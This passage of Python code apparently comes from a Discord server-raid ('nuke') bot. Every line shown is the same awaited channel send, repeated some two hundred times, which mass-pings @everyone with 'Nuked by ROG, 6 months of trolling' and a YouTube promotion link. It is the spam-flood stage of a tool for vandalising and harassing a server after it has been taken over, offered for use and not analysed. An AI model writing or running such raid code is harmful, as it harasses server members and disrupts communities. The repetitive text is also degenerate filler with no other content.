     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
